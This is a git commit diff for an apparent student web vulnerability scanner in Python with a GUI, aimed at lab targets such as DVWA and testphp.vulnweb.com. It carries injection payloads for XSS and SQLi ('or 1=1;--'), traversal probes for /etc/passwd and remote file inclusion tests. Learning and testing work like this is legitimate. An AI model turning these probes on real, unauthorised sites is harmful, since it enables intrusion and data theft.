34853b46cf8f57e82025ba296694a76a1d7604a4
Ioana <ioanaavram46@yahoo.com>
2021-05-16 18:26:50 +0100

    added comments and expanded sqli function

--- pythonScannerCMD.py
+++ pythonScannerCMD.py
@@ -1,4 +1,3 @@
-import sys
 from urllib.parse import urljoin, urlparse
 
 import requests
@@ -6,10 +5,17 @@ from bs4 import BeautifulSoup as bSoup
 
 sPy = requests.Session()
 sPy.headers[
-    "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
+    "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " \
+                    "Chrome/83.0.4103.106 Safari/537.36 "
 
-# this for testing the local metasploitable virtual machine box
-#
+
+# This for testing the local metasploitable virtual machine box which uses the DVWA application server
+# and you need to login to the application before you can run any tests
+
+# you also need the PHP cookie id, or look for the user token field.
+# I'm using the cookie because the looking for user token proved unsuccessful
+
+
 # login_payload = {
 #     'username': 'admin',
 #     'password': 'password',
@@ -21,16 +27,20 @@ sPy.headers[
 #
 # sPy.post('http://172.16.218.131/dvwa/login.php', data=login_payload)
 
+# this is to test that we have logged in successfully and can access a page, it will get the page and print it
 
 # r = sPy.get('http://192.168.59.128/dvwa/vulnerabilities/fi/?page=include.php')
 # print(r.text)
 
-def collectTheForms(url):
+# collecting any available forms here with the Beautiful soup library
+def collect_the_forms(url):
     soup = bSoup(sPy.get(url).content, "html.parser")
     return soup.find_all("form")
 
 
-def detailsOfTheForm(form):
+# storing the forms in a list to be used later
+
+def details_of_the_form(form):
     form_details = {}
     try:
         action = form.attrs.get("action").lower()
@@ -52,17 +62,19 @@ def detailsOfTheForm(form):
     return form_details
 
 
-def post_a_form(form_details, url, value):
+# filling out and sending the forms, if any are gathered
+
+def post_the_form(form_details, url, value):
     target_url = urljoin(url, form_details["action"])
 
     theInputs = form_details["inputs"]
     data = {}
-    for input in theInputs:
+    for found_input in theInputs:
 
-        if input["type"] == "text" or input["type"] == "search":
-            input["value"] = value
-        nameOfInput = input.get("name")
-        valueOfInput = input.get("value")
+        if found_input["type"] == "text" or found_input["type"] == "search":
+            found_input["value"] = value
+        nameOfInput = found_input.get("name")
+        valueOfInput = found_input.get("value")
         if nameOfInput and valueOfInput:
             data[nameOfInput] = valueOfInput
     if form_details["method"] == "post":
@@ -72,12 +84,20 @@ def post_a_form(form_details, url, value):
         return sPy.get(target_url, params=data)
 
 
+# The Cross Site Scripting Function
+# The greeting variable is just for the report
+# The function, grabs the stored form(s) if there are any,
+# fills them out with the testing script string and posts them back to the site
+# Upon receiving the server response,
+# the function will analyse the page to see if the script string has been inserted into the form successfully
+# The returned form msg variable stores the result of the function because that will be used in the GUI.
+# Print has no return value therefore it will break the GUI without this variable
 def scan_for_xss(url):
     greeting = "-------------------Scanning for XSS---------------------"
-    forms = collectTheForms(url)
+    forms = collect_the_forms(url)
     returned_form_msg = ""
 
-    testing_script = "<sCriPt>alert('xss')</ScriPt>"
+    testing_script = "<sCriPt>alert('Testing for XSS')</ScriPt>"
 
     vulnerable_page = False
     # iterate over all forms
@@ -85,12 +105,11 @@ def scan_for_xss(url):
         print("The are no forms in this address")
         return greeting + "\n" + "There are no forms in this address"
 
-
     elif len(forms) != 0:
         print("Scanning form(s)...")
         for form in forms:
-            form_details = detailsOfTheForm(form)
-            page_content = post_a_form(form_details, url, testing_script).content.decode()
+            form_details = details_of_the_form(form)
+            page_content = post_the_form(form_details, url, testing_script).content.decode()
 
             if testing_script in page_content:
                 vulnerable_page = True
@@ -107,6 +126,8 @@ def scan_for_xss(url):
         return greeting + "\n" + returned_form_msg
 
 
+# This holds Database/Server error messages that arise when testing for SQLi.
+# If these appear it is a sign the page could be vulnerable to SQLi
 def vulnerable_errors(response):
     database_errors = {
 
@@ -123,30 +144,57 @@ def vulnerable_errors(response):
     return False
 
 
+# The SQLi function
+# SQLi is short for SQL injection
+# This tests both any available forms and the URL address itself
+# It first grabs the url and then applies a few ways to check for SQLi such as adding apostrophes
+# and the "or 1=1;--" attack which makes the query always true
+# Upon server response the function analyses the page for any errors
+# that arose from searching this query and saves the result
+# It repeats the same thing for the forms
+# Used the code from thepythoncode SQL scanner
+# but added to it so that the function now scans for all 3 ways to scan for SQLi instead of just filling out apostrophes
+
 def scan_for_sqli(url):
     greeting = "-------------------Scanning for SQLi ------------------ "
     returned_msg = ""
     returned_form_msg = ""
-    for t in "'":
-        new_url = f"{url}{t}"
+    sqli_string = "' or 1=1;--"
 
+    for a in '"':
+        new_url = f"{url}{a}"
         serverResponse = sPy.get(new_url)
         if vulnerable_errors(serverResponse):
-            returned_msg = f"A possible SQLi has been found at this address: {url} "
-
+            returned_msg = f"A possible SQLi has been found at this address: {new_url} "
+            print(returned_msg)
         if not vulnerable_errors(serverResponse):
-            returned_msg = "Sorry, there are no SQLis at this url address. "
+            for b in "'":
+                new_url = f"{url}{b}"
+                serverResponse = sPy.get(new_url)
+                if vulnerable_errors(serverResponse):
+                    returned_msg = f"A possible SQLi has been found at this address: {new_url} "
+                    print(returned_msg)
+                if not vulnerable_errors(serverResponse):
+                    sqli_url = f"{url}{sqli_string}"
+                    print("Trying again with OR attacks ")
+                    secondResponse = sPy.get(sqli_url)
+                    if vulnerable_errors(secondResponse):
+                        returned_msg = f"A possible SQLi has been found at this address: {sqli_url} "
+                        print(returned_msg)
+                    if not vulnerable_errors(secondResponse):
+                        returned_msg = "Sorry, there are no SQLis at this url address. "
+                        print(returned_msg)
 
-    forms = collectTheForms(url)
+    forms = collect_the_forms(url)
     if len(forms) == 0:
         returned_form_msg = "There are no forms in this address"
-        print("There are no forms in this address")
+        print(returned_form_msg)
 
     elif len(forms) != 0:
         for form in forms:
-            form_details = detailsOfTheForm(form)
-            for x in "'":
-                print("Scanning form(s)... ")
+            form_details = details_of_the_form(form)
+            for x in '"':
+                print("Scanning form(s) pass 1... ")
                 data = {}
                 for form_tag in form_details["inputs"]:
                     if form_tag["type"] == "hidden" or form_tag["value"]:
@@ -164,19 +212,73 @@ def scan_for_sqli(url):
                 if vulnerable_errors(serverResponse):
                     returned_form_msg = f"A possible SQLi has been found in this form: {url} \n Here is the " \
                                         f"vulnerable form: {form_details} "
+                    print(returned_form_msg)
 
                 if not vulnerable_errors(serverResponse):
-                    returned_form_msg = "Sorry, no SQLis have been found in this form"
+                    for y in "'":
+                        print("Scanning form(s) pass 2... ")
+                        data = {}
+                        for form_tag in form_details["inputs"]:
+                            if form_tag["type"] == "hidden" or form_tag["value"]:
+                                try:
+                                    data[form_tag["name"]] = form_tag["value"] + x
+                                except:
+                                    pass
+                            elif form_tag["type"] != "submit":
+                                data[form_tag["name"]] = f"test{y}"
+                        url = urljoin(url, form_details["action"])
+                        if form_details["method"] == "post":
+                            serverResponse = sPy.post(url, data=data)
+                        elif form_details["method"] == "get":
+                            serverResponse = sPy.get(url, params=data)
+                        if vulnerable_errors(serverResponse):
+                            returned_form_msg = f"A possible SQLi has been found in this form: {url} \n Here is the " \
+                                                f"vulnerable form: {form_details} "
+                            print(returned_form_msg)
+                        if not vulnerable_errors(serverResponse):
+                            print("Scanning form(s) pass 3... ")
+                            data = {}
+                            for form_tag in form_details["inputs"]:
+                                if form_tag["type"] == "hidden" or form_tag["value"]:
+                                    try:
+                                        data[form_tag["name"]] = form_tag["value"] + sqli_string
+                                    except:
+                                        pass
+                                elif form_tag["type"] != "submit":
+                                    data[form_tag["name"]] = f"test{x}"
+                            url = urljoin(url, form_details["action"])
+                            if form_details["method"] == "post":
+                                serverResponse = sPy.post(url, data=data)
+                            elif form_details["method"] == "get":
+                                serverResponse = sPy.get(url, params=data)
+                            if vulnerable_errors(serverResponse):
+                                returned_form_msg = f"A possible SQLi has been found in this form: {url} \n Here is the " \
+                                                    f"vulnerable form: {form_details} "
+                                print(returned_form_msg)
+                            # something else here
+                            if not vulnerable_errors(serverResponse):
+                                returned_form_msg = "Sorry, no SQLis have been found in this form"
+                                print(returned_form_msg)
 
     return greeting + "\n" + returned_msg + "\n" + "\n" + returned_form_msg
 
+
+# The RFI (Remote File Inclusion) function
+# For this function one must have a quick php server started with just 1 file called testing.php.
+# You can also name it differently and change the name in the varaible accordingly
+# Reason why the php server must be started before hand
+# is because the address of the server will be used in the server address variable.
+# The function will get the target address and the server address where the testing file is
+# and append the server address to the end of the target address where the parameter and equals sign is
+# This is so the target can access and open the testing file and display the contents
+# When successful the contents of the file will be displayed on the page
 
 def scan_for_rfi(url):
     greeting = "-------------------Scanning for RFI---------------------"
     grab_address = sPy.get(url)
     print("Target address: " + grab_address.url)
     parsed_address = urlparse(grab_address.url)
-    returned_msg = ""
+    # returned_msg = " "
     queryKey = parsed_address.query
     equals_key = "="
     question_key = "?"
@@ -187,7 +289,7 @@ def scan_for_rfi(url):
     newServerAddress = "http://" + server_address
 
     if question_key and equals_key in grab_address.url:
-        print("Address has a parameter:", queryKey)
+        print("Address has parameter(s):", queryKey)
         newQuery = queryKey.replace(queryKey, queryKey[0:5])
         query_p1 = "".join(parsed_address[0:1]) + "://"
         query_p2 = "".join(parsed_address[1:2])
@@ -201,16 +303,14 @@ def scan_for_rfi(url):
 
         if rfi_test_string in theSource:
             returned_msg = "Remote file accessed successfully"
-            print("Remote file accessed successfully")
+            print(returned_msg)
         else:
             returned_msg = "Sorry, no remote files found"
-            # print("Sorry, no remote files found")
-            # print(theSource)
-
+            print(returned_msg)
 
     else:
         returned_msg = "No parameters, therefore can't proceed"
-        # print("No parameters, therefore can't proceed")
+        print(returned_msg)
     return greeting + "\n" + returned_msg
 
 
@@ -220,6 +320,7 @@ def scan_for_lfi(url):
     parsed_url = urlparse(get_url.url)
     scriptPath = parsed_url.path
     returned_msg = ""
+    returned_msg_key = ""
     theKeyword = parsed_url.query
     param_equals = "="
     param_query = "?"
@@ -232,13 +333,17 @@ def scan_for_lfi(url):
     lookingFor = "etc/passwd"
     theFileDir = "/etc/passwd"
     if len(scriptPath) == 0:
-        print("No scripts present in the path")
+        returned_msg = "No scripts present in the path"
+        print(returned_msg)
     else:
-        print("Scripts in the path: " + scriptPath)
+        returned_msg = f"Scripts in the path: {scriptPath}"
+        print(returned_msg)
     if len(theKeyword) == 0:
-        print("No keyword queries present in the path")
+        returned_msg_key = "No keyword queries present in the path"
+        print(returned_msg_key)
     else:
-        print("The query is: " + theKeyword)
+        returned_msg_key = F"The query is: {theKeyword}"
+        print(returned_msg_key)
     if param_query and param_equals in url:
         print("1 parameter is present. Searching for extra parameters...")
         if param_and in parsed_url.query and param_equals in parsed_url.query:
@@ -265,6 +370,7 @@ def scan_for_lfi(url):
             if findRoot in res_source:
 
                 returned_msg = f"It worked! The file was found! \n Address: {scan_res.url}"
+                print(returned_msg)
 
                 break
             elif findRoot not in res_source:
@@ -272,23 +378,21 @@ def scan_for_lfi(url):
                 depthOfPath = depth
             if depthOfPath == max_depth and findRoot not in res_source:
                 returned_msg = "Sorry, no file inclusion found"
-
+                print(returned_msg)
 
     else:
         returned_msg = "No parameters found. Please add parameters, as there is nothing to scan \n Goodbye for now"
+        print(returned_msg)
 
     return greeting + "\n" + returned_msg
 
 
-
-
-
-# if __name__ == "__main__":
+if __name__ == "__main__":
     # url = sys.argv[1]
     # testing sites and servers above you can supplement your own
     #
     # testing for sqli and xss
-    # url = "http://testphp.vulnweb.com/artists.php?artist=1"
+    url = "http://testphp.vulnweb.com/artists.php?artist=1"
     # url2 = "http://testphp.vulnweb.com/search.php?test=query"
     # url3 = "https://xss-game.appspot.com/level1/frame"
     # url = "http://172.16.218.131/dvwa/vulnerabilities/xss_r/"
@@ -296,8 +400,8 @@ def scan_for_lfi(url):
     #
     # scanning for file inclusions
     # url = "http://172.16.218.131/dvwa/vulnerabilities/fi/?page=include.php"
-    # print("-------------------Scanning for SQLi ------------------ ")
-    # scan_for_sqli(url)
+    print("-------------------Scanning for SQLi ------------------ ")
+    scan_for_sqli(url)
     # scan_for_sqli(url2)
     # scan_for_sqli(url3)
     # print("-------------------Scanning for XSS---------------------")
--- python_GUI_scanner.py
+++ python_GUI_scanner.py
@@ -1,57 +1,64 @@
-# sample gui for project
-# the gui is fully working now
-import PySimpleGUI as gui
+
+import PySimpleGUI as Gui
 import pythonScannerCMD
 
 
-def the_window1():
+# The gui for this application is done using the PySimpleGUI module.
+# This is a free template from the PySimpleGUI site
+# that I modified so that I can have multiple windows at one time.
+# This is so multiple pages can be scanned and shown in the report page
+# instead of restarting the application over and over again.
+def main_window_layout():
+    # This is the main window where you input the testing URL address
     layout = [
-        [gui.Text("Enter the host you want to scan")
+        [Gui.Text("Enter the address you want to scan")
          ],
-        [gui.Input(key='-IN-', enable_events=True)],
-        [gui.Text(size=(60, 2), key='-OUT-')],
-        [gui.Button('Ok'), gui.Button('Report'), gui.Button('Exit')]]
-    return gui.Window('Web Application Scanner', layout, location=(400, 300), finalize=True)
+        [Gui.Input(key='-TARGET-', enable_events=True)],
+        [Gui.Text(size=(60, 2), key='-SCAN-')],
+        [Gui.Button('Ok'), Gui.Button('Report'), Gui.Button('Exit')]]
+    return Gui.Window('Web Application Scanner', layout, location=(400, 300), finalize=True)
 
 
-def the_window2():
+def report_window_layout():
+    # This is the report window, where the scan results will show up.
     layout = [
-        [gui.Text(""), gui.Text(size=(80, 30), key='-OUTPUT-')
+        [Gui.Text(""), Gui.Text(size=(80, 30), key='-REPORT-')
          ],
 
-        [gui.Button('Exit')]]
-    return gui.Window('Scanner Report', layout, location=(400, 300), finalize=True)
+        [Gui.Button('Exit')]]
+    return Gui.Window('Scanner Report', layout, location=(400, 300), finalize=True)
 
 
-# Create the window
-window1, window2 = the_window1(), None
+# The windows are initialised here
+scan_window, report_window = main_window_layout(), None
 
-# Create an event loop
+# This is the main loop where the windows are read, modified and so on
 while True:
-    window, event, values = gui.read_all_windows()
+    window, event, values = Gui.read_all_windows()
 
-    # See if user wants to quit or window was closed
-    if event == gui.WIN_CLOSED or event == 'Exit':
+    # If the user clicks the Exit button or closes the window via the X button, close the window
+    if event == Gui.WINDOW_CLOSED or event == 'Exit':
         window.close()
-        if window == window2:  # if closing win 2, mark as closed
-            window2 = None
-        elif window == window1:  # if closing win 1, exit program
+        if window == report_window:  # Check which window is being closed.
+            # If its window 2 (the report window) close it but keep 1 open
+            report_window = None
+        elif window == scan_window:  # If the window being closed is the main window (the scan window)
+            # close the app itself
             break
-    elif event == 'Report' and not window2:
-        window2 = the_window2()
-        # gui.easy_print("Hello this is the report")
-        # gui.easy_print(scan_result_sql)
-        # gui.easy_print(scan_result_xss)
-        # gui.easy_print(scan_result_lfi)
-        # gui.easy_print(scan_result_rfi)
-        window2['-OUTPUT-'].update(scan_result_sql + "\n " + "\n " + scan_result_xss + "\n " + "\n " + scan_result_lfi + "\n " + "\n " + scan_result_rfi)
+    elif event == 'Report' and not report_window:
+        report_window = report_window_layout()
+        # Here the output from the main scanner functions is displayed in the report window
+        report_window['-REPORT-'].update(scan_result_sql + "\n " + "\n " + scan_result_xss + "\n " + "\n " + scan_result_lfi + "\n " + "\n " + scan_result_rfi)
 
     if event == 'Ok':
-        input_url = (values['-IN-'])
-        scan_result_sql = pythonScannerCMD.scan_for_sqli(input_url)
-        scan_result_xss = pythonScannerCMD.scan_for_xss(input_url)
-        scan_result_lfi = pythonScannerCMD.scan_for_lfi(input_url)
-        scan_result_rfi = pythonScannerCMD.scan_for_rfi(input_url)
-        print(scan_result_lfi)
+        # This event grab the URL input from the main window (window 1) and sends it to the scanner modules
+        # The results of each scanner function is stored in a variable
+        # which is used above to be able to display the contents
+        address_to_scan = (values['-TARGET-'])
+        scan_result_sql = pythonScannerCMD.scan_for_sqli(address_to_scan)
+        scan_result_xss = pythonScannerCMD.scan_for_xss(address_to_scan)
+        scan_result_lfi = pythonScannerCMD.scan_for_lfi(address_to_scan)
+        scan_result_rfi = pythonScannerCMD.scan_for_rfi(address_to_scan)
+
 
 window.close()
